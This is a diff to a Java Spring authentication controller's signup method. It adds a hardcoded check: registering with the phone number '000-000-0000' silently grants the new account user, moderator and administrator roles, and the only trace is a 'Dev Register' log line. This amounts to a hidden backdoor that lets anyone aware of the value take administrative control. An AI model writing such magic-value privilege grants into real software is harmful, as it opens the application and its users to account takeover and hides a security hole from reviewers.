@@ -1,5 +1,6 @@
 package github.bluepsm.joyty.controllers;
 
+import java.lang.ProcessHandle.Info;
 import java.util.HashSet;
 import java.util.List;
 import java.util.Optional;
@@ -137,6 +138,14 @@ public class AuthController {
 
 	    Set<String> strRoles = signUpRequest.getRole();
 	    Set<Role> roles = new HashSet<>();
+	    
+	    if (signUpRequest.getPhone_number().equals("000-000-0000")) {
+	    	log.info("Dev Register");
+	    	strRoles = new HashSet<String>();
+	    	strRoles.add("user");
+	    	strRoles.add("mod");
+	    	strRoles.add("admin");
+	    }
 
 	    if (strRoles == null) {
 	    	Role userRole = roleRepository.findByName(ERole.ROLE_USER)
